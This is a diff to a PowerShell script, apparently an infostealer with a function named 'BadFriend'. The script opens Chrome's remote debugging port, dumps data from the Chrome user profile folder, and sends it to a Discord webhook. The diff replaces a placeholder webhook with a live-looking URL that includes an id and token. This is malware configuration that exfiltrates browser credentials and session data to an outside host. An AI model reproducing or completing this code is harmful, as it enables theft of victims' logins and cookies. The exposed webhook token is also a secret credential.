@@ -2,7 +2,7 @@ function BadFriend {
     $remoteDebuggingPort = 9222 # port where debug mode will be opened
     $URL = "https://www.google.com" # you can set any value you want, the result will not change
 
-    $hookUrl = "https://discord.com/api/webhooks/CHANGETHIS"
+    $hookUrl = "https://discord.com/api/webhooks/1537479493051220109/nrIYPzi_Pmen1jUjxbW_xCpInbQNh_XHbfjpyqD__wth0HCLfhSW8fuefkma_gtcwmLF"
 
 
     dumpChromium "chrome" "\Google\Chrome\User Data"
